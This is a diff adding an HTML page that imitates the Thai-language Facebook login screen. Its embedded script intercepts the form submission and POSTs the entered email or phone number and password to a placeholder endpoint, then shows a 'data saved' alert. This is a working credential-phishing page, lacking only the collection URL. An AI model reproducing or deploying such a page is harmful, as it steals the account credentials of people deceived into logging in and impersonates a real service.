@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - เข้าสู่ระบบหรือสมัครใช้งาน</title>
+    <link rel="stylesheet" href="ffff5.css">
+</head>
+<body>
+   <div class="container">
+    <div>
+        <img src="../New folder/dF5SId3UHWd.svg" alt="">
+    </div>
+    <div> <h2 class="text-center">FacebookFacebook ช่วยคุณเชื่อมต่อและแชร์กับผู้คนมากมายรอบตัวคุณ</h2></div>
+        <div class="boxf">
+            <form method="post" autocomplete="off" name="hello-sheet">
+
+                <input class="kuy" type="email" name="อีเมล" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="อีเมลหรือหมายเลขโทรศัพท์">
+
+                <input class="kuy2" type="password" name="password1" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="รหัสผ่าน">
+
+                <button type="submit" name="submit" value="Send message" class="btnk">เข้าสู่ระบบ</button>
+
+
+                <div class="ccc"><a href=""> ลืมรหัสผ่านหรือไม่</a></div>
+                
+
+
+                <div class="ccc2"><a href="">สร้างบัญชีใหม่</a></div>
+                <div class="ol"></div>
+            </form>
+           
+       </div>
+      
+   </div> 
+   <script>
+    const scriptURL = 'xxx'
+    const form = document.forms['hello-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => alert("บันทึกข้อมูลเรียบร้อยแล้ว.."))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</body>
+</html>
